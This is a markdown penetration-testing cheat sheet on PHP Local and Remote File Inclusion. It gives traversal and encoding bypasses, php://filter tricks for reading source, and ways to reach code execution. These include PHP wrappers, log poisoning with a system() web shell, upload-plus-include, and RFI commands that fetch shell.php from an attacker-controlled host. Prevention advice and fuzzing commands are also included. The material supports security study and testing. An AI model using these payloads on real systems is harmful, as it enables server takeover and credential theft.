# File Inclusion

## Overview

File inclusion vulnerabilities occur when an application allows user input to influence which files are included or executed. There are two main types:

- **Local File Inclusion (LFI)**: The attacker forces the application to include local files from the server.
- **Remote File Inclusion (RFI)**: The attacker forces inclusion of remote files (typically hosted by the attacker), which can lead directly to code execution.

These vulnerabilities are particularly common in PHP applications due to functions like `include()` and `require()`, but similar issues exist in other languages and frameworks.

LFI can often be escalated to remote code execution (RCE) through various techniques.

## Attack Surface

- Dynamic language/theme/include parameters (e.g., `?page=home`, `?language=en`, `?file=header`)
- File viewing or download functionality that constructs paths from user input
- Any code that uses user-controlled data with file inclusion functions without sanitization

## Identification

- Identify parameters that appear to control which file or module is loaded.
- Test with known local files (e.g., `/etc/passwd` on Linux) using path traversal sequences.
- Fuzz for parameters and observe response differences (status codes, content length, or rendered vs raw output).
- Look for files that return non-200 status codes during normal fuzzing — they may still be readable via LFI.
- Test for PHP wrappers and other protocol handlers that indicate inclusion functionality.

## Exploitation

### Basic LFI

Common readable files:
- Linux: `/etc/passwd`
- Windows: `C:\Windows\boot.ini` or `C:\Windows\win.ini`

Examples:
```text
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?language=/../../../etc/passwd
/index.php?language=./languages/../../../../etc/passwd
```

### LFI Bypasses

- Double dot with forward slashes: `....//....//....//....//etc/passwd`
- URL encoding: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
- Path truncation (older PHP): append many `./` after a fake directory.
- Null byte (older systems): `../../../../etc/passwd%00`

### Reading PHP Source / Config with Filters

Use PHP filters to read source or config without execution:
```bash
/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

To check PHP settings:
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0K...' | base64 -d | grep allow_url_include
echo 'W1BIUF0K...' | base64 -d | grep expect
```

### Second Order LFI

Set a username or other stored value to a traversal string like `../../../../etc/passwd`. It may be processed unsafely when that value is later used in an include.

### Achieving Remote Code Execution

**PHP Wrappers** (require `allow_url_include` to be enabled for some):

- Data wrapper (base64 encoded shell):
  `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`

- Input wrapper:
  `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://.../index.php?language=php://input&cmd=id"`

- Expect wrapper:
  `curl -s "http://.../index.php?language=expect://id"`

**RFI**:
- Host a shell on your server and include it:
  `/index.php?language=http://<YOUR_IP>:<PORT>/shell.php&cmd=id`
- Use FTP or SMB for alternative delivery on some servers.

**LFI + File Upload**:
- Upload a file containing PHP code disguised as an image (e.g., `GIF8<?php system($_GET["cmd"]); ?>` saved as .gif or .jpg).
- Include the uploaded file: `/index.php?language=./uploads/shell.gif&cmd=id`
- Zip/phar tricks for more advanced bypasses.

**Log Poisoning**:
- Poison access logs or session files by setting a malicious User-Agent or other header, then include the log file.
- Example:
  `curl -s "http://target/index.php" -A '<?php system($_GET["cmd"]); ?>'`
  Then include `/var/log/apache2/access.log`

**Notes on locations**:
- PHP sessions often in `/var/lib/php/sessions/sess_<PHPSESSID>` (Linux) or `C:\Windows\Temp\` (Windows).
- Default logs: Apache `/var/log/apache2/`, Nginx `/var/log/nginx/`.

### Checking PHP Configuration via LFI

Useful to determine if wrappers or other features are available.

## Impact

- Full source code disclosure
- Reading of sensitive configuration files, keys, and credentials
- Remote code execution in many cases
- Complete server compromise when chained with other issues

## Prevention

- Never use user input directly in file inclusion functions.
- Use a strict whitelist of allowed pages/files.
- Disable `allow_url_include` and `allow_url_fopen` where possible.
- Apply input validation and canonicalization of paths.
- Run the web server and application with minimal privileges.
- Use modern templating or inclusion mechanisms that do not rely on filesystem includes for user-controlled content.

## Tools & Payloads

### Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
```

### Useful Wordlists

- LFI-Jhaddix.txt
- Webroot path wordlists (Linux/Windows)
- Server configurations wordlists
- Popular LFI parameters

### Tools

- LFISuite
- LFiFreak
- liffy

### PHP Inclusion Functions Reference

| Function              | Read Content | Execute | Remote URL |
|-----------------------|--------------|---------|------------|
| include()/include_once() | Yes         | Yes     | Yes        |
| require()/require_once() | Yes         | Yes     | No         |
| file_get_contents()   | Yes          | No      | Yes        |
| fopen()/file()        | Yes          | No      | No         |

**Tip**: Use curl with specific flags when testing RFI to clean output:
```bash
curl -w "\n" -s 'http://target/index.php?language=http://attacker/shell.php&cmd=ls+/' | grep -v "<.*>"
```

See also the [Path Traversal](path-traversal.md) page for foundational traversal techniques.
